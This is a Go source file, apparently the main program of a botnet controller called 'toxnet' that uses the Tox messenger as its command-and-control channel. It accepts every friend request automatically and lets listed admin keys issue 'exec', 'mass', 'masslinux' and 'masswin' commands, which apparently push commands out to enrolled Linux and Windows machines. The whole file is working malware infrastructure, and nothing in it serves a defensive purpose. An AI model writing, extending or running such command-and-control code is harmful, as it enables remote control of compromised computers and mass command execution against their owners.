package main

import (
	"fmt"
	"strings"
	"time"

	"github.com/0x4meliorate/toxnet/net"

	tox "github.com/TokTok/go-toxcore-c"
)

func main() {

	net.Usage()

	var t = net.Tox_instance

	net.Bootstrap()
	net.ToxWrite()
	net.ShowC2()

	t.CallbackFriendRequest(func(t *tox.Tox, friendId string, message string, userData interface{}) {
		senderNum, err := t.FriendAddNorequest(friendId)
		if err != nil {
			fmt.Println("[-] Error: Failed to add incoming friend -", senderNum, err)
		}
		if senderNum < 100000 {
			net.ToxWrite()
		}
	}, nil)

	t.CallbackFriendMessage(func(t *tox.Tox, senderNum uint32, message string, userData interface{}) {

		senderKey, err := t.FriendGetPublicKey(senderNum)
		if err != nil {
			fmt.Println(err)
		}

		messages := strings.Fields(message)

		// Check if sender is an admin
		for _, admin := range net.Admins {
			if senderKey == admin[0:64] {
				if strings.ToLower(messages[0]) == "help" {
					net.AdminHelp(senderNum)
				} else if strings.ToLower(messages[0]) == "list" {
					net.AdminList(senderNum)
				} else if strings.ToLower(messages[0]) == "exec" {
					net.AdminExec(senderKey, messages)
				} else if strings.ToLower(messages[0]) == "mass" {
					net.AdminMass(senderNum, senderKey, messages)
				} else if strings.ToLower(messages[0]) == "masslinux" {
					net.AdminMassLinux(senderNum, senderKey, messages)
				} else if strings.ToLower(messages[0]) == "masswin" {
					net.AdminMassWin(senderNum, senderKey, messages)
				}
			} else {
				net.BotResponse(messages)
			}
		}
	}, nil)

	// toxcore loops
	shutdown := false
	for !shutdown {
		t.Iterate()
		time.Sleep(1000 * 50 * time.Microsecond)
	}
	t.Kill()
}
